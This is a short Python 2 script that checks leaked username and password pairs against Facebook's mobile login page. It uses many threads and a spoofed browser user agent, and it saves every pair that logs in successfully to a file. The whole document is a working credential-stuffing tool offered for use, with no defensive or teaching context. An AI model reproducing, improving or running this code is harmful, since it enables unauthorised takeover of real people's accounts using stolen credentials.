from mechanize import Browser
import threading

def chunkIt(seq, num):
  avg = len(seq) / float(num)
  out = []
  last = 0.0
  while last < len(seq):
    out.append(seq[int(last):int(last + avg)])
    last += avg
  return out
def check(acs):
    for a in acs:
        try:
            a = a.rsplit()[0]
        except:
            pass
        try:
            if a:
                a = a.split(':')
                user = a[0]
                passw = a[1]
                br = Browser()
                br.set_handle_gzip(True)
                br.set_handle_robots(False)
                br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
                br.open('http://m.facebook.com/login.php')
                br.select_form(nr=0)
                br.form['email'] = user
                br.form['pass'] = passw
                br.submit()
                if 'm.facebook.com/login.php' in br.geturl() or 'checkpoint' in br.geturl() or 'to confirm your account with Facebook.' in br.response().read():
                            print "Could not login with " + str(a)

                else:
                    print "Logged in with " + user
                    opn = open(newfile, 'a')
                    opn.write(user + ":" + passw + '\n')
                    opn.close()

        except:
            print "Could not login with " + str(a)


acs = open(raw_input("File with accounts: ")).readlines()
newfile = raw_input("File to save the working accounts into: ")
nbthreads = input("Number of threads: ")
if len(acs) > nbthreads:
    z = chunkIt(acs, nbthreads)
    for passz in z:
        threading.Thread(target=check, args=(passz,)).start()
else:
        print "You do not have enough accounts for this number of threads"
        z = chunkIt(acs, len(acs))
        for passz in z:
            threading.Thread(target=check, args=(passz,)).start()






